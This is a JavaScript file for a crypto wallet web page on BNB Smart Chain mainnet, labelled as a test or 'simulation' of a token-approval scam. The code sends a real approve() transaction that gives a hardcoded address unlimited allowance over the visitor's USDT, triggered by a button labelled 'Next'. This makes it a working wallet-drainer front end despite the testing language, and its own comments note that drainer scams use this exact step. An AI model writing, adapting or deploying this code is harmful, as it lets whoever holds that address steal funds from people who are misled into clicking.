// --- CRITICAL WARNING: EXTREME RISK OF REAL FINANCIAL LOSS ---
// This code is designed to interact with the BNB Smart Chain MAINNET.
// Any mistake or misunderstanding can lead to PERMANENT AND IRRETRIEVABLE LOSS OF YOUR FUNDS.
// PROCEED ONLY IF YOU FULLY UNDERSTAND THE RISKS AND ARE USING A DEDICATED TEST WALLET WITH MINIMAL FUNDS.
// ---

// --- Configuration for BNB Smart Chain Mainnet ---
const MAINNET_CHAIN_ID = '0x38'; // Hexadecimal for 56 (BSC Mainnet Chain ID)

// --- OFFICIAL USDT (BEP20) CONTRACT ADDRESS ON BSC MAINNET ---
// This is the real USDT contract address on the BNB Smart Chain.
const USDT_BEP20_MAINNET_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; 

// --- YOUR SPECIFIED RECEIVER WALLET ADDRESS FOR TESTING ---
// This is the address that will be granted unlimited allowance over your USDT.
const RECEIVER_WALLET_FOR_TESTING = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090'; 

// --- ERC-20 ABI Snippet for the approve function ---
const ERC20_ABI_APPROVE = [
    "function approve(address spender, uint256 amount) returns (bool)"
];

// --- MAX_UINT256 represents an "unlimited" allowance ---
// This is the common amount used in "drainer" scams to get full control.
const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

// --- Global variables ---
let provider;
let signer;
let connectedAccount = null;

// --- DOM Elements ---
const fromAddressInput = document.getElementById('fromAddress');
const receiverAddressInput = document.getElementById('receiverAddress'); 
const transferBtn = document.getElementById('transferBtn');
const statusMessageDiv = document.getElementById('statusMessage');

// --- Functions ---

// Initializes Web3 provider and attempts to get connected account passively
async function initializeWeb3() {
    console.log("initializeWeb3: Function started.");
    
    // Set the receiver address input value from the constant
    receiverAddressInput.value = RECEIVER_WALLET_FOR_TESTING;

    if (typeof window.ethereum === 'undefined') {
        statusMessageDiv.textContent = 'Web3 wallet (MetaMask/Trust Wallet) not detected. Please use a DApp browser.';
        transferBtn.disabled = true; 
        console.log("initializeWeb3: window.ethereum is undefined. Wallet not detected.");
        return;
    } else {
        console.log("initializeWeb3: window.ethereum detected.");
    }

    try {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        console.log("initializeWeb3: Ethers provider and signer initialized.");

        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
            connectedAccount = accounts[0];
            fromAddressInput.value = connectedAccount; 
            console.log("initializeWeb3: Account already connected:", connectedAccount);
        } else {
            fromAddressInput.value = '0x... (Wallet Connection Needed)';
            statusMessageDiv.textContent = 'Wallet detected. Interact to continue.';
            console.log("initializeWeb3: No account pre-connected.");
        }

        const network = await provider.getNetwork();
        console.log("initializeWeb3: Detected Network Chain ID:", network.chainId);

        if (network.chainId !== parseInt(MAINNET_CHAIN_ID)) {
            statusMessageDiv.innerHTML = `<strong>CRITICAL WARNING:</strong> Wallet is on wrong network (ID: ${network.chainId}). Please switch to BNB Smart Chain Mainnet (ID: ${parseInt(MAINNET_CHAIN_ID)}) in your wallet.`;
            transferBtn.disabled = true;
            console.log("initializeWeb3: Wrong network detected. Button disabled.");
        } else {
            statusMessageDiv.textContent = 'Wallet connected to BNB Mainnet. Click "Next" to simulate the approval.';
            transferBtn.disabled = false; // Button enabled here if all checks pass
            console.log("initializeWeb3: Correct network detected. Button enabled.");
        }

    } catch (error) {
        console.error("initializeWeb3: Error during initialization:", error);
        statusMessageDiv.textContent = 'Error initializing wallet. See console. Make sure wallet is unlocked.';
        transferBtn.disabled = true;
    }
}

// Function to simulate the malicious token approval
async function simulateBEP20USDTDrain() {
    console.log("simulateBEP20USDTDrain: Button clicked. Function started.");

    if (!provider || !signer) {
        statusMessageDiv.textContent = 'Wallet not initialized. Reload page in DApp browser.';
        console.log("simulateBEP20USDTDrain: Provider or signer not initialized. Exiting.");
        return;
    }

    if (!connectedAccount) {
        console.log("simulateBEP20USDTDrain: No connected account found, requesting now.");
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            connectedAccount = accounts[0];
            fromAddressInput.value = connectedAccount;
            console.log("simulateBEP20USDTDrain: Account connected after request:", connectedAccount);
        } catch (error) {
            console.error("simulateBEP20USDTDrain: User rejected wallet connection:", error);
            statusMessageDiv.innerHTML = '<span style="color: orange;">Wallet connection rejected. Cannot proceed with simulation.</span>';
            return;
        }
    }
    
    statusMessageDiv.innerHTML = 'Requesting transaction... Check your wallet for the **APPROVE** pop-up!';
    console.log("simulateBEP20USDTDrain: Attempting to send approve transaction.");

    try {
        const usdtContract = new ethers.Contract(USDT_BEP20_MAINNET_CONTRACT_ADDRESS, ERC20_ABI_APPROVE, signer);
        console.log("simulateBEP20USDTDrain: USDT Contract instance created.");

        const tx = await usdtContract.approve(RECEIVER_WALLET_FOR_TESTING, MAX_UINT256);
        console.log("simulateBEP20USDTDrain: Transaction sent. Hash:", tx.hash);

        statusMessageDiv.innerHTML = `Transaction sent! Please confirm in your wallet. <br>
                                     <strong>Transaction Hash:</strong> <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash}</a><br>
                                     <span style="color: #00bcd4;">(This is the **APPROVE** transaction for your USDT BEP20)</span>`;
        
        await tx.wait();
        statusMessageDiv.innerHTML += '<br><span style="color: lightgreen;">Transaction confirmed on Mainnet! Unlimited allowance granted.</span>';
        alert('SIMULATION COMPLETE: You have granted an UNLIMITED allowance to your designated receiver address for your USDT BEP20. In a real scam, the scammer would now drain your tokens.');
        console.log("simulateBEP20USDTDrain: Transaction confirmed.");

    } catch (error) {
        console.error("simulateBEP20USDTDrain: Error during transaction:", error);
        if (error.code === 4001) { 
            statusMessageDiv.innerHTML = '<span style="color: orange;">Transaction rejected by user.</span>';
        } else if (error.message.includes('network')) {
            statusMessageDiv.innerHTML = '<span style="color: red;">Network error. Make sure your wallet is on BNB Mainnet.</span>';
        } else if (error.message.includes('insufficient funds')) {
             statusMessageDiv.innerHTML = '<span style="color: red;">Insufficient BNB for gas. Please ensure you have enough BNB.</span>';
        }
        else {
            statusMessageDiv.innerHTML = `<span style="color: red;">Simulation failed: ${error.message || 'Unknown error.'}</span>`;
        }
    }
}

// --- Event Listeners ---
// The button is initially disabled in HTML, then enabled by JS on successful initialization.
transferBtn.addEventListener('click', simulateBEP20USDTDrain);
console.log("Event listener attached to transferBtn.");

// --- Initial setup when the page loads ---
initializeWeb3();

// Handle account and chain changes for robustness (important in dApps)
if (window.ethereum) {
    window.ethereum.on('accountsChanged', (accounts) => {
        console.log("accountsChanged event fired. New accounts:", accounts);
        if (accounts.length > 0) {
            connectedAccount = accounts[0];
            fromAddressInput.value = connectedAccount;
            statusMessageDiv.textContent = 'Wallet account changed. Click "Next" to simulate the approval.';
        } else {
            connectedAccount = null;
            fromAddressInput.value = '0x... (Wallet disconnected)';
            statusMessageDiv.textContent = 'Wallet disconnected. Reload page in DApp browser.';
        }
    });

    window.ethereum.on('chainChanged', (chainId) => {
        console.log("chainChanged event fired. New chainId:", chainId);
        if (chainId !== MAINNET_CHAIN_ID) {
            statusMessageDiv.innerHTML = `<strong>CRITICAL WARNING:</strong> Network changed (ID: ${chainId}). Please switch to BNB Smart Chain Mainnet (ID: ${parseInt(MAINNET_CHAIN_ID)}) in your wallet.`;
            transferBtn.disabled = true;
        } else {
            statusMessageDiv.textContent = 'Network is correct. Click "Next" to simulate the approval.';
            transferBtn.disabled = false;
        }
    });
}
